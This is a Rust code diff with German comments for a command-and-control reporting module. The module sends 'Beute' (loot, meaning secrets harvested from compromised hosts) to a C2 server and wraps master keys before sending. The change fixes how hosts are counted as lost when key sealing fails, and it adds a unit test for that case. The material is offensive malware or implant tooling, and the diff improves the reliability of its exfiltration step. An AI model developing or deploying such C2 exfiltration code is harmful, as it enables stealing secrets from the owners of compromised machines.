@@ -127,6 +127,10 @@ pub fn melde(port: &dyn C2Port, sealer: Option<&KeySealer>, funde: &[HostFund]) 
                         "Master-Key für Host {} nicht kapselbar — die Beute bleibt hier",
                         fund.host_id
                     );
+                    // Der Host wurde nie registriert — er ist damit auch
+                    // verloren. Ohne diese Zeile meldete ein Host **ohne**
+                    // Beute den Lauf als Erfolg, obwohl der C2 ihn nicht kennt.
+                    ergebnis.hosts_verloren += 1;
                     ergebnis.beute_verloren += fund.secrets.len();
                     continue;
                 }
@@ -384,7 +388,34 @@ mod tests {
         );
         assert_eq!(ergebnis.beute_gemeldet, 0);
         assert_eq!(ergebnis.beute_verloren, 3);
+        assert_eq!(
+            ergebnis.hosts_verloren, 1,
+            "der Host wurde nie registriert — er ist auch verloren"
+        );
         assert!(ergebnis.fehlgeschlagen());
+    }
+
+    /// Schlägt die Kapselung fehl, ist der Host verloren — auch dann, wenn er
+    /// gar keine Beute liefert.
+    ///
+    /// Ohne Beute gab es vorher nichts zu verlieren, und der Lauf meldete
+    /// Erfolg — obwohl der C2-Server den Host nicht kennt.
+    #[test]
+    fn schlaegt_die_kapselung_fehl_ist_auch_ein_host_ohne_beute_verloren() {
+        let port = Aufzeichner::neu();
+        let sealer = kaputter_sealer();
+        let ergebnis = melde(&port, Some(&sealer), &[fund("192.168.1.5", 0)]);
+
+        assert!(
+            port.hosts().is_empty(),
+            "der Host wurde trotz kaputter Kryptografie registriert"
+        );
+        assert_eq!(ergebnis.hosts_verloren, 1);
+        assert_eq!(ergebnis.beute_verloren, 0);
+        assert!(
+            ergebnis.fehlgeschlagen(),
+            "ein unbekannter Host darf keinen Erfolg melden"
+        );
     }
 
     /// Ein Host ohne Beute, dessen Registrierung scheitert, ist trotzdem ein
